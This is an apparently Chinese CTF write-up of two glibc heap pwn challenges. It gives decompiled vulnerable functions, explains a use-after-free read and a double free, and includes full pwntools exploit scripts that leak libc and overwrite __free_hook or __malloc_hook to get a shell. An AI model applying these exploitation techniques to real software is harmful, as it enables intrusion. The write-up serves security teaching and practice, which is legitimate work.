<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D72</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(qword_2020A0[v2]);</span><br><span class="line">    qword_2020A0[v2] = <span class="number">0L</span>L;</span><br><span class="line">    v0 = dword_202060;</span><br><span class="line">    dword_202060[v2] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free过后，堆块内容未清空，也就是说，我们申请一个堆块，然后free掉，在申请到这个堆块时候，就可以查看原来堆块的内容</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>初始化堆块操作</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>填满tcache，并利用unsortbin泄露libc地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure>

<p>我反过来删除是因为show好弄些，也可以正向删除，show(7)</p>
<ol start="3">
<li>重点，这里的大小要构造好，被复制和被覆盖的得分清楚，最后造成overlap chunk，然后修改tcache的fd指针成malloc_hook就行了，这里跟fastbin不太相似，fastbin这种攻击大小限制得是0x70大小chunk，因为错位的时候只有0x7f通常</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4 被复制的size</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6 size部分将被覆盖</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">7</span>) </span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>


<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'mergeheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'mergeheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc-2.27.so'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">        delete(<span class="number">7</span>-i)</span><br><span class="line">    add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'7'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">6</span>) <span class="comment">#构造overlap chunk</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(free_hook)</span><br><span class="line">    add(<span class="number">0x80</span>, payload) <span class="comment">#6</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x20</span>, p64(system_addr))</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="2019-网络内生安全试验场-pwn1"><a href="#2019-网络内生安全试验场-pwn1" class="headerlink" title="2019 网络内生安全试验场 pwn1"></a>2019 网络内生安全试验场 pwn1</h2><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>创建一个堆块</li>
<li>展示所有堆块</li>
<li>删除一个堆块</li>
<li>删除所有堆块</li>
<li>离开</li>
</ol>
<h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( lifecount )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which life do you want to remove: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !*(&amp;lifelist + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)*(&amp;lifelist + v1) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;lifelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Successful , God !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No life in this lonely planet~ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里存在double free，free后为置空</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>我是多次利用double free然后成的,这道题说实话很坑，malloc_hook本地改成one_gadget是可以成功的，远程怎么打都打不上，后面学到一个骚操作，double free触发malloc_hook？？？原理我也不清楚，不过确实远程拿到shell了</p>
<ol>
<li>利用double free泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x00000000006020E0</span><span class="number">-0x20</span><span class="number">-0x30</span><span class="number">-0x6</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"a"</span>, <span class="string">"0"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"b"</span>, <span class="string">"1"</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(ptr), <span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'3'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="string">'4'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">5</span> , <span class="string">'5'</span>)<span class="comment">#5</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">"bbbbb"</span>)</span><br><span class="line">stdout_addr = u64(io.recvuntil(<span class="string">"Level"</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">stdout_addr = hex(stdout_addr)[:<span class="number">-2</span>]</span><br><span class="line">stdout_addr = int(stdout_addr, <span class="number">16</span>)</span><br><span class="line">io.success(<span class="string">"stdout_addr: 0x%x"</span> % stdout_addr)</span><br><span class="line"></span><br><span class="line">libc_base = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">realloc_addr = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">ptr = malloc_hook<span class="number">-0x20</span><span class="number">-0x3</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>利用double free改写地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">"a"</span>, <span class="string">"6"</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"b"</span>, <span class="string">"7"</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(ptr), <span class="string">'8'</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'9'</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'a'</span>, <span class="string">'10'</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'c'</span>*<span class="number">0x10</span>+ <span class="string">'d'</span>*<span class="number">0x3</span> + p64(one_gadget), <span class="string">'6'</span>)</span><br><span class="line">io.success(<span class="string">"malloc_hook: 0x%x"</span> % malloc_hook)</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base )</span><br><span class="line">io.success(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>double free 拿到shell，这里其实malloc一次本地可以拿shell，远程不行，原因未详，可能栈环境对不上</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn1'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'pwn1'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, level)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Length of the name :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"The name of this life :"</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">"The level of this life (High/Low) :"</span>, level)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Which life do you want to remove: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span 